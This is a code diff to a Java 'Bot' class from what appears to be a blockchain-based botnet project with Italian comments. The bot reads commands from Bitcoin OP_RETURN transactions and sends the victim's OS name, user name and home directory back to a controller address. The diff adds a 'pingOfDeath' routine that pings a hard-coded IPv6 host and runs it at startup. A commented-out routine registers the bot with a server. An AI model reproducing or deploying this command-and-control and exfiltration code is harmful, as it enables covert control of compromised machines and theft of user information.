@@ -1,4 +1,7 @@
 import java.io.File;
+import java.io.IOException;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.StringTokenizer;
@@ -18,6 +21,9 @@ import org.bitcoinj.utils.BriefLogFormatter;
 import org.bitcoinj.wallet.SendRequest;
 import org.bitcoinj.wallet.Wallet;
 import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;
+import org.icmp4j.IcmpPingRequest;
+import org.icmp4j.IcmpPingResponse;
+import org.icmp4j.IcmpPingUtil;
 
 import com.google.common.util.concurrent.FutureCallback;
 import com.google.common.util.concurrent.Futures;
@@ -40,7 +46,7 @@ public class Bot {
         
 
         // Start up a basic app using a class that automates some boilerplate.
-        kit = new WalletAppKit(params, new File("Bot"), filePrefix);
+        kit = new WalletAppKit(params, new File("Bot3"), filePrefix);
         
         // Download the block chain and wait until it's done.
         kit.startAsync();
@@ -63,52 +69,94 @@ public class Bot {
                 // be called in onSetupCompleted() above. But we don't do that here to demonstrate the more common
                 // case of waiting for a block.
                 
-                System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
-                try {
-					String messaggio=readOpReturn(tx);
-					String[] v=messaggio.split("-");
-					String comando=v[0];
-					
-				System.out.println("comando: "+comando);
-				
-				String addressString=v[1];
-				
-				System.out.println("address:"+addressString);
-				Address address=new Address(params,addressString);
-					
-					//gestione delle risposte a seconda dei comandi del botMaster
-					switch (comando) {
-					case "ping":
-						sendCommand("ping_ok-"+list.get(0).toString(), address);
-						break;
-					case "os":
-						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
-                        break;
-					case "username":
-						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
-						break;
-					case "userhome":
-						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
-						break;
-					default:
-						break;
-					}
-				} catch (Exception e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-                
-                
+                if(kit.wallet().getBalance().isGreaterThan(Coin.MILLICOIN)){
+                	 System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
+                     try {
+     					String messaggio=readOpReturn(tx);
+     					String[] v=messaggio.split("-");
+     					String comando=v[0];
+     					
+     				System.out.println("comando: "+comando);
+     				
+     				String addressString=v[1];
+     				
+     				System.out.println("address:"+addressString);
+     				Address address=new Address(params,addressString);
+     					
+     					//gestione delle risposte a seconda dei comandi del botMaster
+     					switch (comando) {
+     					case "ping":
+     						sendCommand("ping_ok-"+list.get(0).toString(), address);
+     						break;
+     					case "os":
+     						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
+                             break;
+     					case "username":
+     						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
+     						break;
+     					case "userhome":
+     						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
+     						break;
+     					case "pingOfDeath":
+    						String risultato=pingOfDeath();
+    						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
+     					default:
+     						break;
+     					}
+     				} catch (Exception e) {
+     					// TODO Auto-generated catch block
+     					e.printStackTrace();
+     				}
+                }
+                else{
                 
                 Futures.addCallback(tx.getConfidence().getDepthFuture(1), new FutureCallback<TransactionConfidence>() {
                     @Override
                     public void onSuccess(TransactionConfidence result) {
                         System.out.println("Transazione ricevuta con successo!!!!!!");
+                       
                         /*
                          * Inoltrare la transazione ricevuta nuovamente al BotMaster
                          */
                        // forwardCommand("ping_ok", tx);
                        
+                        System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
+                        try {
+        					String messaggio=readOpReturn(tx);
+        					String[] v=messaggio.split("-");
+        					String comando=v[0];
+        					
+        				System.out.println("comando: "+comando);
+        				
+        				String addressString=v[1];
+        				
+        				System.out.println("address:"+addressString);
+        				Address address=new Address(params,addressString);
+        					
+        					//gestione delle risposte a seconda dei comandi del botMaster
+        					switch (comando) {
+        					case "ping":
+        						sendCommand("ping_ok-"+list.get(0).toString(), address);
+        						break;
+        					case "os":
+        						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
+                                break;
+        					case "username":
+        						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
+        						break;
+        					case "userhome":
+        						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
+        						break;
+        					case "pingOfDeath":
+        						String risultato=pingOfDeath();
+        						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
+        					default:
+        						break;
+        					}
+        				} catch (Exception e) {
+        					// TODO Auto-generated catch block
+        					e.printStackTrace();
+        				}
                     }
 
                     @Override
@@ -117,6 +165,7 @@ public class Bot {
                         throw new RuntimeException(t);
                     }
                 });
+                }
             }
         });
 
@@ -138,9 +187,17 @@ public class Bot {
      
         System.out.println("Waiting for coins to arrive. Press Ctrl-C to quit.");
 
+        //String myAddress=list.get(0).toString();
+        //registerBot(myAddress);
+        
+        pingOfDeath();
+        
+        
         try {
             Thread.sleep(Long.MAX_VALUE);
         } catch (InterruptedException ignored) {}
+        
+        
     }
     
     public static String readOpReturn(Transaction tx) throws Exception {
@@ -188,6 +245,44 @@ public class Bot {
 		
 		return transaction.getHashAsString();		
 	}
+    
+    public static String pingOfDeath(){
+    	// request
+    	
+    	final IcmpPingRequest request = IcmpPingUtil.createIcmpPingRequest ();
+    	
+    	request.setHost ("2001:0:34ae:348:306c:2f5c:3f57:d449:8080");
+
+        request.setPacketSize(650);
+    	// repeat a few times
+    	for (int count = 1; count <= 4; count ++) {
+
+    	// delegate
+    	final IcmpPingResponse response = IcmpPingUtil.executePingRequest (request);
+
+    	// log
+    	final String formattedResponse = IcmpPingUtil.formatResponse (response);
+    	System.out.println (formattedResponse);
+
+    	// rest
+    	try {
+			Thread.sleep (1000);
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+    	}
+    	String result="Il server è stato pingato";
+    	return result;
+    }
+    
+   /* public static void registerBot(String address) throws IOException{
+ 	   String url="http://192.168.43.182:8080/ServerBotChain/WriteBotServlet?address="+address;
+ 		 URL u = new URL(url);
+ 		 URLConnection ucon = u.openConnection();
+ 		  ucon.getInputStream();
+    }*/
+    
     
     
    /* public static void forwardCommand(String response, String address) {
